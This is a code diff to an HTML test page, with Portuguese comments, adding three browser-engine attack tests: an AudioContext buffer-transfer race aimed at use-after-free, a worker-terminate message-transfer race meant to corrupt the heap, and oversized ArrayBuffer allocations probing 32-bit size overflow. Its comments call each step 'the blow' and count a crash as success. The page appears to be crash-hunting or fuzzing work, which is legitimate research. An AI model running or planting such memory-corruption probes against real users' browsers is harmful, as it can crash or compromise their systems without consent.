@@ -30,6 +30,9 @@
     <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>
     <button onclick="runCollatorRecursion()">STACK OVERFLOW Intl.Collator Infinite Recursion</button>
 
+	<button onclick="runAudioRace()">TEST 1: AudioContext Thread Race (Use-After-Free)</button>
+    <button onclick="runWorkerTermination()">TEST 2: Worker Terminate Transfer Race</button>
+    <button onclick="runLargeArrayOverflow()">TEST 3: Large Array Buffer Overflow</button>
 
     <div id="log">Status: Aguardando testes...</div>
     <canvas id="c" width="100" height="100"></canvas>
@@ -464,6 +467,145 @@
             }
         }
 
+
+
+function log(msg) { 
+            document.getElementById('log').innerText += `[${new Date().toLocaleTimeString()}] ${msg}\n`; 
+        }
+
+        // --- TESTE 1: AudioContext Thread Race ---
+        // Tenta causar uma corrida entre a thread de áudio (Kernel/Hardware) e a thread JS.
+        // Se a thread de áudio tentar ler um buffer que o JS acabou de deletar, CRASH.
+        function runAudioRace() {
+            log("Iniciando Audio Race (Pode travar o console)...");
+            
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const duration = 2; // segundos
+                
+                // Cria buffers massivos
+                const frameCount = ctx.sampleRate * duration;
+                const buffer = ctx.createBuffer(2, frameCount, ctx.sampleRate);
+                
+                // Enche com dados
+                for (let ch = 0; ch < 2; ch++) {
+                    const data = buffer.getChannelData(ch);
+                    for (let i = 0; i < frameCount; i++) data[i] = Math.random();
+                }
+
+                const src = ctx.createBufferSource();
+                src.buffer = buffer;
+                src.connect(ctx.destination);
+                src.start();
+
+                // O GOLPE:
+                // Tenta "Neutrar" (esvaziar) os dados do buffer enquanto ele toca.
+                // Usamos um Worker para transferir a posse da memória.
+                setTimeout(() => {
+                    log("Tentando transferir buffer de áudio em execução...");
+                    try {
+                        const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
+                        
+                        // A API Web Audio antiga permitia acesso aos arrays subjacentes.
+                        // Tentamos transferir o ArrayBuffer de um canal.
+                        const channelData = buffer.getChannelData(0).buffer;
+                        
+                        // Se isso funcionar, a thread de áudio fica sem chão.
+                        w.postMessage(channelData, [channelData]);
+                        w.terminate();
+                        log("Transferência solicitada.");
+                    } catch(e) {
+                        log("Falha no ataque: " + e.message);
+                    }
+                }, 100); // Timing crítico
+
+            } catch(e) {
+                log("Erro Audio: " + e.message);
+            }
+        }
+
+        // --- TESTE 2: Worker Terminate Transfer Race ---
+        // Cria um Worker, envia dados e mata o Worker imediatamente.
+        // Tenta corromper o heap do sistema que gerencia mensagens IPC.
+        function runWorkerTermination() {
+            log("Iniciando Worker Termination Race...");
+            
+            const workerCode = `
+                self.onmessage = function(e) {
+                    // Tenta processar e responder
+                    const arr = new Uint8Array(e.data);
+                    // Loop para manter a thread ocupada
+                    for(let i=0; i<1000000; i++) arr[0] = i;
+                    self.postMessage(arr.buffer, [arr.buffer]);
+                };
+            `;
+            
+            const blob = new Blob([workerCode], {type: 'text/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            // Tenta o ataque repetidamente
+            let i = 0;
+            const interval = setInterval(() => {
+                i++;
+                if (i > 50) {
+                    clearInterval(interval);
+                    log("Teste finalizado (Sem crash).");
+                    return;
+                }
+
+                const w = new Worker(url);
+                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
+                
+                // Envia memória
+                w.postMessage(buffer, [buffer]);
+                
+                // O GOLPE: Mata o worker imediatamente.
+                // O Kernel tem que limpar a memória do Worker.
+                // Se a mensagem ainda estiver "em trânsito", pode haver corrupção.
+                w.terminate();
+                
+                if (i % 10 === 0) log("Ciclo " + i + " executado.");
+            }, 20);
+        }
+
+        // --- TESTE 3: Large Array Buffer Overflow ---
+        // Tenta alocar um ArrayBuffer que causa overflow no cálculo de tamanho interno.
+        // Focado em limites de 32-bit vs 64-bit.
+        function runLargeArrayOverflow() {
+            log("Iniciando Allocation Overflow...");
+            
+            // Valores perigosos para o alocador (que podem virar 0 ou negativo)
+            const sizes = [
+                0xFFFFFFFF, // Max Uint32
+                0x80000000, // Max Int32 + 1
+                2147483648, 
+                4294967296
+            ];
+
+            sizes.forEach(size => {
+                try {
+                    log(`Tentando alocar: ${size} bytes...`);
+                    
+                    // Se o motor não validar, e tentar alocar size_t(size),
+                    // pode ocorrer wrap-around ou falha catastrófica.
+                    const arr = new Uint8Array(size);
+                    
+                    // Se chegou aqui, algo muito estranho aconteceu.
+                    log("ALERTA: Alocação de " + size + " permitida! (Tamanho real: " + arr.length + ")");
+                    
+                    // Tenta escrever no final para ver se a memória existe
+                    arr[size - 1] = 0x41;
+                    
+                } catch(e) {
+                    // Erro esperado (RangeError).
+                    // Se crashar (tela azul), é Sucesso.
+                }
+            });
+            log("Teste de Alocação finalizado.");
+        }
+		
+
     </script>
 </body>
 </html>
+
